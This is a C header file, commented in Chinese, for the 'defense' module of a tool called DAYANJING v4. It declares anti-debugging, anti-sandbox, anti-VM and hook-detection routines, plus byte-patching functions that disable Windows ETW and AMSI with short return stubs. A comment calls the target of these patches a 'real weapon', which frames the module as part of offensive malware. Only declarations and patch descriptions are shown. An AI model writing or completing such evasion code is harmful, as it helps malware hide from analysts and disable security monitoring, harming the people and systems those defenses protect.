/* DAYANJING v4 — 19_defense 对抗检测层
 * 反调试 / 反沙箱 / 反虚拟机 / 钩子检测 / ETW-AMSI 修补
 * 无第三方依赖，纯 C11 + POSIX。
 */
#ifndef DEFENSE_H
#define DEFENSE_H

#include <stddef.h>
#include <stdint.h>

#define DF_OK              0

#define DF_ERR_ARGS      (-1)
#define DF_ERR_IO        (-2)
#define DF_ERR_NOMEM     (-3)
#define DF_ERR_UNSUP     (-4)
#define DF_ERR_NOTFOUND  (-5)
#define DF_ERR_BUFSMALL  (-6)
#define DF_ERR_RANGE     (-7)

/* 判定：数值越大越可疑，便于聚合取最大值 */
#define DF_CLEAN          0
#define DF_SUSPECT        1
#define DF_HOSTILE        2

#define DF_PATH_MAX     256

const char *df_errstr(int e);

/* 聚合：忽略错误码，取两者中更可疑者 */
int  df_verdict_or(int a, int b);

/* ---- debug.c：反调试 ---- */
int  df_debug_tracerpid(int *out_pid);
int  df_debug_ptrace_traceme(void);
int  df_debug_timing(uint64_t threshold_ns, uint64_t *out_ns);

/* ---- sandbox.c：反沙箱 ---- */
int  df_sandbox_cgroup_file(const char *path, char *out_marker, size_t cap, int *out_verdict);
int  df_sandbox_cgroup(char *out_marker, size_t cap, int *out_verdict);
int  df_sandbox_dockerenv(void);
int  df_sandbox_env(void);
int  df_sandbox_pid1(char *out_comm, size_t cap);

/* ---- vm.c：反虚拟机 ---- */
int  df_vm_dmi_file(const char *path, char *out, size_t cap);
int  df_vm_dmi(char *out, size_t cap);
int  df_vm_cpuinfo(void);
int  df_vm_mac(const char *dir, char *out, size_t cap);
int  df_vm_kvmdev(void);
int  df_vm_aggregate(void);

/* ---- hook.c：钩子 / 断点检测 ---- */
int  df_hook_maps_file(const char *path, unsigned long *out_exec, unsigned long *out_total);
int  df_hook_maps(unsigned long *out_exec, unsigned long *out_total);
int  df_hook_prologue(const uint8_t *code, size_t len, const uint8_t *expect, size_t elen);

/* ---- evade.c：特征查找与字节级修补 ---- */
int  df_evade_find(const uint8_t *buf, size_t len, const uint8_t *pat, size_t plen,
                   size_t *out_off);
int  df_evade_patch_at(uint8_t *buf, size_t len, size_t off,
                       const uint8_t *repl, size_t rlen);
int  df_evade_patch_first(uint8_t *buf, size_t len, const uint8_t *pat, size_t plen,
                          const uint8_t *repl, size_t rlen, size_t *out_off);
/* ETW / AMSI：按调用方已解析出的函数偏移写入 6/3 字节返回桩。
 * 偏移量由 GetProcAddress 一类解析得到，本层不做特征搜索——
 * 搜索易误命中，真实武器应打在确切地址上。 */
int  df_evade_etw(uint8_t *buf, size_t len, size_t off);
int  df_evade_amsi(uint8_t *buf, size_t len, size_t off);

#define DF_ETW_PATCH_LEN   3u   /* xor eax,eax; ret */
#define DF_AMSI_PATCH_LEN  6u   /* mov eax,E_INVALIDARG; ret */

#endif /* DEFENSE_H */
